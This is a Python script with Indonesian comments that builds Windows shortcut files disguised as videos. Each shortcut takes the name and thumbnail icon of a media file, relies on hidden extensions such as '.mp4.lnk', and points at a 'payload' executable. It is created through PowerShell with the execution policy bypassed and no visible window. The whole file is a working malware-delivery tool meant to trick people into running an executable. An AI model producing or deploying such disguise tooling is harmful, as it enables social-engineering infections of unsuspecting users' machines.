"""tools/lnk.py — shortcut yang kelihatan seperti file media.

Windows nyembunyiin ekstensi default, jadi `Film.mp4.lnk` tampil sebagai
`Film.mp4` lengkap dengan thumbnail. Double-click = jalan. Ini vektor yang
paling realistis dibanding polyglot, karena benar-benar ada eksekusi.
"""

import os
import subprocess

CREATE_NO_WINDOW = 0x08000000


def ico_from(image_path, dest=None):
    """Ambil gambar apa pun jadi .ico multi-size buat icon shortcut."""
    from PIL import Image

    dest = dest or os.path.splitext(image_path)[0] + ".ico"
    img = Image.open(image_path).convert("RGBA")
    side = max(img.size)
    canvas = Image.new("RGBA", (side, side), (0, 0, 0, 0))
    canvas.paste(img, ((side - img.size[0]) // 2, (side - img.size[1]) // 2))
    canvas = canvas.resize((256, 256), Image.LANCZOS)
    canvas.save(dest, format="ICO", sizes=[(256, 256), (48, 48), (32, 32), (16, 16)])
    return dest


def make_lnk(target, lnk_path, args="", icon="", workdir="", window_style=7):
    workdir = workdir or os.path.dirname(os.path.abspath(target))
    script = (
        "$w = New-Object -ComObject WScript.Shell; "
        "$s = $w.CreateShortcut('%s'); "
        "$s.TargetPath = '%s'; "
        "$s.Arguments = '%s'; "
        "$s.WorkingDirectory = '%s'; "
        "%s"
        "$s.WindowStyle = %d; "
        "$s.Save()"
    ) % (
        lnk_path.replace("'", "''"),
        target.replace("'", "''"),
        args.replace("'", "''"),
        workdir.replace("'", "''"),
        ("$s.IconLocation = '%s'; " % icon.replace("'", "''")) if icon else "",
        window_style,
    )
    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-Command", script],
                   capture_output=True, timeout=60,
                   creationflags=CREATE_NO_WINDOW)
    return lnk_path


def disguise(payload_exe, media_file, out_dir=None, visible_name=None):
    """Bikin `<nama>.mp4.lnk` yang nunjuk ke payload, icon dari media_file."""
    out_dir = out_dir or os.path.dirname(os.path.abspath(payload_exe))
    stem = visible_name or os.path.splitext(os.path.basename(media_file))[0]
    icon = ico_from(media_file, os.path.join(out_dir, stem + ".ico"))
    lnk = os.path.join(out_dir, stem + os.path.splitext(media_file)[1] + ".lnk")
    return make_lnk(payload_exe, lnk, icon=icon)


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("pakai: python lnk.py <payload.exe> <video.mp4>")
        sys.exit(1)
    print(disguise(sys.argv[1], sys.argv[2]))
